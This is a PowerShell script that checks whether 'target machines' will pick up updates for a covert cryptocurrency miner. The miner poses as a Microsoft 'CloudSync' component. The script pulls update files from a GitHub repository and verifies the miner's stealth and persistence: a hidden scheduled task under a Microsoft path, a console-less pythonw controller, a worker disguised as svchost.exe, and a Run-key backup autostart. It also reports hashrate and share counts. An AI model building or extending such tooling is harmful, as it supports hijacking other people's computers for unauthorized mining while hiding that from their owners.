<#
.SYNOPSIS
    Fleet check: will this machine pick up the published update?

.DESCRIPTION
    Read-only. Compares what the controller WOULD fetch with what is installed,
    without touching anything.

    Checks:
      * the local manifest (update_base, legacy_update)
      * whether manifest.json exists in the repo
      * per-file: remote present? hash match? would it be adopted?
      * scheduled task: exists, hidden, has a logon trigger, uses pythonw.exe
      * whether the controller and worker are running

    Run this on a target machine after publishing, before waiting 15 minutes.

.EXAMPLE
    powershell -NoProfile -File .\check-updates.ps1
#>
[CmdletBinding()]
param(
    [string]$InstallDir = (Join-Path $env:LOCALAPPDATA 'Microsoft\CloudSync')
)

$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Ok   ($m) { Write-Host ("  [ OK ] {0}" -f $m) -ForegroundColor Green }
function Warn ($m) { Write-Host ("  [WARN] {0}" -f $m) -ForegroundColor Yellow }
function Bad  ($m) { Write-Host ("  [FAIL] {0}" -f $m) -ForegroundColor Red }

Write-Host "=== CloudSync update check ==="
Write-Host "install dir: $InstallDir"

$localManifest = Join-Path $InstallDir 'manifest.json'
if (-not (Test-Path $localManifest)) { Bad "no manifest.json in the install dir"; exit 1 }

$m = Get-Content $localManifest -Raw | ConvertFrom-Json
$base = $m.update_base
if (-not $base) { $base = 'https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/' }
if (-not $base.EndsWith('/')) { $base += '/' }

Write-Host "update base: $base"
Write-Host ("legacy_update: {0}" -f [bool]$m.legacy_update)
Write-Host ""

# ---- 1. is the remote manifest there? ------------------------------------
$remoteFiles = $null
try {
    $raw = (Invoke-WebRequest -UseBasicParsing -Uri "$base/manifest.json" -TimeoutSec 20).Content
    $remote = $raw | ConvertFrom-Json
    $remoteFiles = @($remote.files | Where-Object { $_.path -and $_.sha256 -and -not $_.sha256.StartsWith('__') })
    Ok "remote manifest.json found (version $($remote.version), $($remoteFiles.Count) files)"
} catch {
    Warn "no remote manifest.json ($($_.Exception.Message))"
    if ($m.legacy_update) {
        Warn "legacy mode is ON - the controller will compare the fixed file list directly"
        $remoteFiles = @(@{ path = 'controller.py' }, @{ path = 'gpudetect.py' }, @{ path = 'config_high.json' })
    } else {
        Bad "remote updates are IDLE - publish manifest.json (make-manifest.ps1) or set legacy_update: true"
    }
}

# ---- 2. per-file verdict -------------------------------------------------
if ($remoteFiles) {
    Write-Host ""
    Write-Host "file                     installed   remote   verdict"
    foreach ($f in $remoteFiles) {
        $name = $f.path
        $localPath = Join-Path $InstallDir $name
        $localHash = if (Test-Path $localPath) { (Get-FileHash -LiteralPath $localPath -Algorithm SHA256).Hash.ToLower() } else { $null }
        $remoteHash = $null
        try {
            $tmp = Join-Path $env:TEMP ("cu_" + $name)
            Invoke-WebRequest -UseBasicParsing -Uri "$base$name" -OutFile $tmp -TimeoutSec 30
            $remoteHash = (Get-FileHash -LiteralPath $tmp -Algorithm SHA256).Hash.ToLower()
            Remove-Item $tmp -Force
        } catch { }

        if (-not $remoteHash) {
            Write-Host ("{0,-24} {1,-11} {2,-8} not in repo (kept as-is)" -f $name,
                ($(if ($localHash) { "present" } else { "MISSING" })), "-")
            continue
        }
        $same = ($localHash -eq $remoteHash)
        $verdict = if ($same) { "up to date" } elseif ($f.sha256 -and $remoteHash -ne $f.sha256.ToLower()) { "hash MISMATCH vs manifest" } else { "WOULD UPDATE" }
        Write-Host ("{0,-24} {1,-11} {2,-8} {3}" -f $name,
            ($(if ($localHash) { "present" } else { "MISSING" })), "present", $verdict)
    }
}

# ---- 3. scheduling + liveness -------------------------------------------
Write-Host ""
$taskPath = '\Microsoft\Windows\CloudSync\'
$xml = Export-ScheduledTask -TaskName 'CloudSync' -TaskPath $taskPath 2>$null
if ($xml) {
    Ok "main task exists"
    if ($xml -match '<Hidden>true</Hidden>') { Ok "task hidden" } else { Warn "task is NOT hidden" }
    if ($xml -match 'LogonTrigger') { Ok "logon trigger present (auto-start on sign-in)" } else { Bad "no logon trigger - will not start after a reboot" }
    $cmd = [regex]::Match($xml, '<Command>(.*?)</Command>').Groups[1].Value
    if ($cmd -match 'pythonw\.exe$') { Ok "runs pythonw.exe (no console window)" } else { Warn "runs $cmd - that opens a console window" }
} else {
    Bad "main task missing"
}

$ctl = Get-CimInstance Win32_Process -Filter "Name='pythonw.exe'" | Where-Object { $_.CommandLine -like '*controller.py*' }
$wrk = Get-CimInstance Win32_Process -Filter "Name='svchost.exe'" | Where-Object { $_.ExecutablePath -like "$InstallDir*" }
if ($ctl) { Ok "controller running (pid $($ctl.ProcessId))" } else { Warn "controller not running" }
if ($wrk) { Ok "worker running (pid $($wrk.ProcessId))" } else { Warn "worker not running (idle threshold? battery?)" }

# second persistence
$runPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$runVal = (Get-ItemProperty -Path $runPath -Name 'CloudSync' -ErrorAction SilentlyContinue).CloudSync
if ($runVal) { Ok "Run key present (backup autostart)" } else { Warn "Run key MISSING - only the scheduled task remains" }

# throttle state
$st = Join-Path $InstallDir 'state.json'
if (Test-Path $st) {
    $s = Get-Content $st -Raw | ConvertFrom-Json
    Write-Host ("  cap: {0}%  throttled={1}  job={2}" -f $s.cpu_cap_pct, $s.throttled, $s.job)
}

$state = Join-Path $InstallDir 'state.json'
if (Test-Path $state) {
    $s = Get-Content $state -Raw | ConvertFrom-Json
    Write-Host ""
    Write-Host ("state: profile={0} gpu={1} rate={2} accepted={3} rejected={4}" -f $s.profile, $s.gpu, $s.hashrate, $s.accepted, $s.rejected)
}

Write-Host ""
Write-Host "=== done ==="
